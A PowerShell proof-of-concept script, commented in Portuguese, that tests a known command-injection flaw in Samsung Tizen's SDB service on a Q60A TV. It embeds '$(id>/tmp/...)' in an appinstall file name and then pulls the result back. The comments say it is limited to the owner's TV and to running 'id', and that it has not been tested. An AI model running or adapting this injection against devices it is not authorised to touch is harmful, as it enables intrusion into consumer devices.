#requires -Version 5.1
<#
  Samsung Q60A / Tizen 6.0: teste pontual SDB NAO-ROOT.
  Inspirado no estudo publico Bishop Fox (2026):
  https://bishopfox.com/blog/samsung-tizen-os-version-through-9-0

  Requer: TV propria, Developer Mode ja ativo e UMA TV ligada por SDB.
  O teste tenta executar APENAS 'id' no contexto do servico SDB e
  redireciona o resultado para um ficheiro de /tmp na TV.
  Nao inicia reverse shell, nao se liga a servidores, nao pede root,
  nao altera firmware, nao modifica rede, nao instala apps.
  Ainda NAO foi testado em Tizen 6.0 / Q60A.

  E um teste de explorabilidade de uma vulnerabilidade conhecida; o
  comando SDB podera devolver 'closed'/erro mesmo quando for executado.
#>
[CmdletBinding()]
param(
  [string]$Sdb = 'C:\tizen-studio\tools\sdb.exe'
)
$ErrorActionPreference='Stop'
if(-not (Test-Path -LiteralPath $Sdb -PathType Leaf)){
  throw "SDB nao encontrado: $Sdb"
}
$devices=@(& $Sdb devices 2>&1 | Where-Object {$_ -match '^\S+\s+device(?:\s|$)'})
if($devices.Count -ne 1){
  throw "Esperava exatamente 1 TV ligada por SDB; encontrei $($devices.Count)."
}
Write-Host 'TV Samsung detetada via SDB (identificadores ocultados).'
Write-Host 'A executar UNICAMENTE o comando de consulta de identidade id, sem root.'
$token=[Guid]::NewGuid().ToString('N').Substring(0,12)
$remote="/tmp/hugo_sdb_probe_$token.txt"
$local=Join-Path $env:TEMP ("hugo_sdb_probe_"+$token+".txt")

# Expressao com $(...) e passada como argumento LITERAL a sdb.exe
# a partir de variavel PowerShell, nao e executada pelo Windows.
# Se vulneravel, /bin/sh na TV executa 'id', gravando APENAS o
# resultado em /tmp. A tentativa de instalar 'test.tpk.tpk' pode falhar.
$payload='0 appinstall tpk test.tpk$(id>{0}).tpk' -f $remote

Write-Host '1/2 — Teste SDB local (um comando, sem persistencia)...'
$cmdOut=@(& $Sdb shell $payload 2>&1)
$cmdOut | Select-Object -Last 8 | ForEach-Object {Write-Host $_}

Write-Host '2/2 — A tentar recuperar o resultado de /tmp via SDB pull...'
$pullOut=@(& $Sdb pull $remote $local 2>&1)
if(Test-Path -LiteralPath $local -PathType Leaf){
  $value=(Get-Content -LiteralPath $local -Raw -ErrorAction SilentlyContinue).Trim()
  if($value -match '^uid=\d+\(') {
    Write-Host 'PROVA DE EXECUCAO NA TV:'
    Write-Host $value
    Write-Host 'Nota: executar como sdk/owner NAO concede root nem CAP_NET_ADMIN.'
  } else {
    Write-Host 'Ficheiro obtido, mas conteudo inesperado: nao assumir que o teste foi bem-sucedido.'
  }
}else{
  Write-Host 'Resultado INCONCLUSIVO: ficheiro nao recuperado por SDB pull.'
  Write-Host 'O teste pode estar corrigido, ter sido bloqueado, ou o pull pode nao aceder a /tmp.'
  Write-Host 'Mensagem resumida do pull:'
  $pullOut | Select-Object -Last 7 | ForEach-Object {Write-Host $_}
}
Write-Host 'Fim. Nao foram pedidas passwords nem foram alteradas rotas, VPN ou firmware.'
